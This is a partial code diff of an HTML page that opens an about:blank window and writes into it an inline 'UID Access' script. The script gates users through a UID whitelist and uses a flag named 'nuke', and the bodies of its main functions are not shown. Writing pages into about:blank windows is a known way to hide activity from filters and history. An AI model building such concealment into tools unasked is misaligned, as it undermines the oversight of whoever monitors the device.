@@ -1,24 +1,22 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>bro</title>
 </head>
 <body>
   <script>
-// JavaScript and HTML code as a string
-const win = window.open('about:blank');
+    const win = window.open('about:blank');
 
-// JavaScript and HTML code as a string
-const scriptContent = `
+    const scriptContent = `
       <!DOCTYPE html>
       <html>
       <head>
         <title>UID Access</title>
       </head>
       <body>
-        `+"<script"+">"+`
+        <script>
           var nuke = false;
 
           const whitelist = [
@@ -75,7 +73,7 @@ const scriptContent = `
             }
 
             if (!isWhitelisted(name, uid)) {
-              alert("Access denied. You are not whitelisted.");
+              alert("Access denied. You are not whitelisted."+uid);
               window.close();
               return;
             }
@@ -110,15 +108,13 @@ const scriptContent = `
           }
 
           initiate22();
-        `+"<script"+">"+`
+        <\/script>
       </body>
       </html>
-    `
-// Encode the entire HTML content
-const encodedScriptContent = encodeURIComponent(scriptContent);
+    `;
 
-// Write the encoded content to the new window
-win.document.write(decodeURIComponent(encodedScriptContent));
+    win.document.write(scriptContent);
+    win.document.close();
   </script>
 </body>
 </html>
